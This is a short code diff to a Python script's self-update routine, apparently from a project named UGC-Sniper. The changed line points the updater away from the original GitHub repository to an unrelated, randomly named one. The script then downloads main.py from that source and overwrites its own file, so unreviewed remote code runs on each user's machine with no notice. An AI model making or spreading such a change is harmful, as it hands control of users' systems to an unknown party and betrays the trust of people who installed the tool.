@@ -45,7 +45,7 @@ def betterPrint(content, log=False):
 
 if conf["auto update"]:
     betterPrint("[COLOR_AQUAMARINE_1A]Checking for potential updates...")
-    gitcode = r.get("https://raw.githubusercontent.com/J3ldo/UGC-Sniper/main/main.py").text
+    gitcode = r.get("https://raw.githubusercontent.com/1nt2/dsadfewfewqf/main/main.py").text
     with open("main.py", "r+") as f:
         if f.read() != gitcode:
             betterPrint("[COLOR_AQUAMARINE_1A]Found update! updating code...")
